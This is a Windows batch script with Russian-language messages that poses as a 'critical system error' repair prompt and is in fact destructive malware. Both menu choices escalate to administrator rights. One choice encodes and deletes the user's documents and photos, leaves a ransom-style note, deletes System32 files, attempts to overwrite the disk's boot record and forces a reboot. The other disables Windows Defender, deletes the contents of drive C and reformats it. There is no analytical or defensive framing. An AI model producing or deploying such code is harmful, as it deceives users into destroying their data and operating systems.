@echo off
chcp 65001 >nul
title КРИТИЧЕСКАЯ ОШИБКА
mode con cols=70 lines=20
color 4f

:start
cls
echo ╔══════════════════════════════════════════════════╗
echo ║           КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ             ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║     Обнаружено повреждение системных файлов      ║
echo ║                                                  ║
echo ║     Выполнить автоматическое восстановление?     ║
echo ║                                                  ║
echo ╚══════════════════════════════════════════════════╝
echo.
echo   [1] ДА - Восстановление системы
echo   [2] НЕТ - Обычное форматирование
echo.

choice /c 12 /n /m "Выберите действие (1 или 2): "

if errorlevel 2 goto format
if errorlevel 1 goto destroy

:destroy
cls
echo ╔══════════════════════════════════════════════════╗
echo ║           УНИЧТОЖЕНИЕ СИСТЕМЫ...                 ║
echo ╚══════════════════════════════════════════════════╝
echo.

:: Получение прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell start-process '%0' -verb runas
    exit
)

:: Шифрование файлов (XOR)
echo Шифрование пользовательских данных...

for %%d in (C D E F) do (
    if exist %%d:\ (
        echo Шифрование диска %%d:...
        
        :: Создание списка файлов
        dir %%d:\*.doc %%d:\*.docx %%d:\*.xls %%d:\*.xlsx %%d:\*.pdf %%d:\*.jpg %%d:\*.png /s/b > %temp%\files.txt 2>nul
        
        :: Шифрование каждого файла
        for /f "usebackq delims=" %%f in (%temp%\files.txt) do (
            if exist "%%f" (
                certutil -encode "%%f" "%temp%\temp.enc" >nul 2>&1
                copy /y "%temp%\temp.enc" "%%f.encrypted" >nul 2>&1
                del "%%f" >nul 2>&1
            )
        )
    )
)

:: Создание сообщения вымогателя
echo ======================================== > %userprofile%\Desktop\README.txt
echo ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ! >> %userprofile%\Desktop\README.txt
echo ======================================== >> %userprofile%\Desktop\README.txt
echo. >> %userprofile%\Desktop\README.txt
echo Все ваши документы, фото и базы данных зашифрованы. >> %userprofile%\Desktop\README.txt
echo. >> %userprofile%\Desktop\README.txt
echo Ключ шифрования: %random%%random%%random% >> %userprofile%\Desktop\README.txt
echo. >> %userprofile%\Desktop\README.txt
echo ПЕРЕЗАГРУЗКА УНИЧТОЖИТ ВАШУ СИСТЕМУ! >> %userprofile%\Desktop\README.txt

:: Удаление System32
echo Удаление системных файлов...
takeown /f C:\Windows\System32\* /r /d y >nul 2>&1
icacls C:\Windows\System32\* /grant %username%:F /t /c /q >nul 2>&1

:: Массовое удаление
del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
del /f /s /q C:\Windows\System32\*.exe >nul 2>&1
del /f /s /q C:\Windows\System32\drivers\*.sys >nul 2>&1
rmdir /s /q C:\Windows\System32\config >nul 2>&1

:: Повреждение MBR
echo Создание загрузочного повреждения...
powershell -Command "$mbr = New-Object byte[] 512; [byte[]](0x00)*512 | %%{$mbr[$_] = 0xFF}; [System.IO.File]::WriteAllBytes('\\.\PHYSICALDRIVE0', $mbr)" >nul 2>&1

:: Перезагрузка
echo.
echo СИСТЕМА УНИЧТОЖЕНА! ПЕРЕЗАГРУЗКА ЧЕРЕЗ 10 СЕКУНД...
shutdown /r /f /t 10
exit

:format
cls
echo ╔══════════════════════════════════════════════════╗
echo ║           ФОРМАТИРОВАНИЕ ДИСКА C:...             ║
echo ╚══════════════════════════════════════════════════╝
echo.

:: Получение прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell start-process '%0' -verb runas
    exit
)

:: Отключение защиты
echo Отключение защиты Windows...
net stop WinDefend /y >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1

:: Удаление всего с диска C
echo Удаление файлов с диска C:...
del /f /s /q C:\*.* >nul 2>&1
rmdir /s /q C:\Windows >nul 2>&1
rmdir /s /q C:\Program Files >nul 2>&1
rmdir /s /q C:\Program Files (x86) >nul 2>&1
rmdir /s /q C:\Users >nul 2>&1

:: Быстрое форматирование через diskpart
echo Форматирование диска C:...
echo select volume C > %temp%\disk.txt
echo clean >> %temp%\disk.txt
echo create partition primary >> %temp%\disk.txt
echo format fs=ntfs quick >> %temp%\disk.txt
echo exit >> %temp%\disk.txt
diskpart /s %temp%\disk.txt >nul 2>&1

:: Создание сообщения
echo ======================================== > %userprofile%\Desktop\format_done.txt
echo ДИСК C: УСПЕШНО ОТФОРМАТИРОВАН >> %userprofile%\Desktop\format_done.txt
echo ======================================== >> %userprofile%\Desktop\format_done.txt

:: Перезагрузка
echo.
echo ФОРМАТИРОВАНИЕ ЗАВЕРШЕНО! ПЕРЕЗАГРУЗКА ЧЕРЕЗ 5 СЕКУНД...
shutdown /r /f /t 5
exit
